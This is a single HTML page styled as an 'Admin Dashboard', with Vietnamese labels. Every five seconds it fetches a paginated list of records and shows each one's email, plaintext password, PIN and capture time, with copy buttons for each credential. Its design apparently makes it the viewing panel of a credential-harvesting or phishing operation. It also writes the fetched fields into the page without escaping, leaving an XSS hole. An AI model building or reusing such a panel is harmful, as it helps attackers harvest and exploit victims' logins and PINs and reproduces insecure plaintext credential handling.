<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Admin Panel - User List</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #f8fafc;
        }
        .copy-icon {
            cursor: pointer;
            font-size: 13px;
            color: #2563eb;
        }
        .copy-icon:hover {
            text-decoration: underline;
        }
        .pagination-btn {
            padding: 0.5rem 1rem;
            background-color: #e5e7eb;
            border-radius: 0.375rem;
            font-size: 0.875rem;
            font-weight: 500;
        }
        .pagination-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        .time-label {
            background-color: #fef3c7;
            color: #92400e;
            font-weight: 600;
            font-size: 13px;
            padding: 2px 6px;
            border-radius: 6px;
            display: inline-block;
        }
    </style>
</head>
<body class="bg-gray-100 px-4 py-6 md:px-10">
<h1 class="text-2xl md:text-3xl font-bold mb-6 text-gray-800 text-center md:text-left">👑 Admin Dashboard</h1>

<!-- bảng cuộn ngang khi trên mobile -->
<div class="bg-white shadow-md rounded-lg overflow-x-auto w-full">
    <table class="min-w-full table-auto text-sm">
        <thead class="bg-gray-100 text-gray-700 uppercase text-xs">
        <tr>
            <th class="px-4 py-3 text-left">Email</th>
            <th class="px-4 py-3 text-left">Password</th>
            <th class="px-4 py-3 text-left">PIN</th>
            <th class="px-4 py-3 text-left">Thời gian</th>
        </tr>
        </thead>
        <tbody id="user-table-body" class="text-gray-800 divide-y">
        </tbody>
    </table>
</div>

<!-- pagination responsive -->
<div class="p-4 flex flex-wrap justify-center items-center gap-3 mt-4" id="pagination-controls">
    <button id="prev-btn" class="pagination-btn">← Trang trước</button>
    <button id="next-btn" class="pagination-btn">Trang sau →</button>
</div>

<script>
    let currentPage = 1;
    let lastPage = 1;

    function copyToClipboard(id) {
        const text = document.getElementById(id).innerText;
        navigator.clipboard.writeText(text).catch(() => {});
    }

    function loadUsers(page = 1) {
        $.getJSON('/api/users?page=' + page, function (res) {
            currentPage = res.current_page;
            lastPage = res.last_page;

            let html = '';
            res.data.forEach((user, index) => {
                html += `
                    <tr>
                        <td class="px-4 py-4">
                            <span class="inline-flex items-center gap-x-1">
                                <span id="email${index}">${user.email}</span>
                                <span class="copy-icon" onclick="copyToClipboard('email${index}')">📋</span>
                            </span>
                        </td>
                        <td class="px-4 py-4">
                            <span class="inline-flex items-center gap-x-1">
                                <span id="password${index}">${user.password}</span>
                                <span class="copy-icon" onclick="copyToClipboard('password${index}')">📋</span>
                            </span>
                        </td>
                        <td class="px-4 py-4">
                            <span class="inline-flex items-center gap-x-1">
                                <span id="pin${index}">${user.pin}</span>
                                <span class="copy-icon" onclick="copyToClipboard('pin${index}')">📋</span>
                            </span>
                        </td>
                        <td class="px-4 py-4">
                            <span class="time-label">${user.created_at}</span>
                        </td>
                    </tr>`;
            });
            $('#user-table-body').html(html);
            $('#prev-btn').prop('disabled', currentPage <= 1);
            $('#next-btn').prop('disabled', currentPage >= lastPage);
        });
    }

    $('#prev-btn').on('click', () => {
        if (currentPage > 1) {
            loadUsers(currentPage - 1);
        }
    });

    $('#next-btn').on('click', () => {
        if (currentPage < lastPage) {
            loadUsers(currentPage + 1);
        }
    });

    loadUsers();
    setInterval(() => {
        loadUsers(currentPage);
    }, 5000);
</script>
</body>
</html>
